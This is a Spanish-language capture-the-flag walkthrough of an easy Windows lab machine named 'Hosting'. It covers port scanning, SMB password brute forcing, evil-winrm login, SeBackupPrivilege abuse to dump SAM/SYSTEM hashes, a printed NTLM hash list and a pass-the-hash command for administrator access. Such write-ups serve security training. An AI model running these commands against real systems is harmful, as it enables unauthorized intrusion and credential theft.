---
description: '🔍 Dificultad: Fácil'
---

# Hosting

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.76
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1145).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.76 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1146).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los puertos **80, 135, 139, 445** y varios en el rango **49664-49670** están abiertos. Estos pertenecen a los servicios de **HTTP, Microsoft RPC, NetBIOS-SSN, Microsoft-DS** y otros puertos desconocidos, por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p80,135,139,445 -v 192.168.1.76
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

Revisamos directorios.

```
gobuster dir -u http://192.168.1.76 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```



Encontramos el directorio **/speed**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-01 115358.png" alt=""><figcaption></figcaption></figure>

Adjuntamos el dominio a /etc/hosts.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-01 115523.png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Hacemos una lista de usuarios para realizar fuerza bruta.

```bash
nxc smb 192.168.1.76 -u usuarios -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

<figure><img src="../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

Listamos recursos compartidos. Pero no encontramos nada relevante.

<figure><img src="../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>

Listamos usuarios.

<figure><img src="../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

Vemos que con m.davis tenemos su contraseña.

<figure><img src="../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

Comprobamos que j.wilson tiene la misma contraseña. Nos conectamos con **evil-winrm**.

```bash
evil-winrm -i 192.168.1.76 -u j.wilson -p 'H0$T1nG123!'
```

<figure><img src="../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

```bash
whoami
```

Dado que el sistema cuenta con el permiso **SeBackupPrivilege**, es posible realizar una copia de los archivos **SAM** y **SYSTEM** para extraer los hashes de las credenciales.

<figure><img src="../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

Nos la descargamos.

```
*Evil-WinRM* PS C:\temp> download system                                   
Info: Downloading C:\temp\system to system                                      
Info: Download successful!

*Evil-WinRM* PS C:\temp> download sam                                       
Info: Downloading C:\temp\sam to sam                                     
Info: Download successful!
```

Extraemos los hashes.

```bash
samdump2 system sam > hashes.txt
```

Ahora con John los crackeamos.

<figure><img src="../../.gitbook/assets/image (1158).png" alt=""><figcaption></figcaption></figure>

```
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8afe1e889d0977f8571b3dc0524648aa:::
administrator:1002:aad3b435b51404eeaad3b435b51404ee:41186fb28e283ff758bb3dbeb6fb4a5c:::
p.smith:1003:aad3b435b51404eeaad3b435b51404ee:2cf4020e126a3314482e5e87a3f39508:::
f.miller:1004:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
m.davis:1005:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
j.wilson:1006:aad3b435b51404eeaad3b435b51404ee:a6cf5ad66b08624854e80a8786ad6bac:::
```

Nos conectamos. Ya somos **root**.

```bash
evil-winrm -i 192.168.1.76 -u administrator -H 41186fb28e283ff758bb3dbeb6fb4a5c
```

<figure><img src="../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>
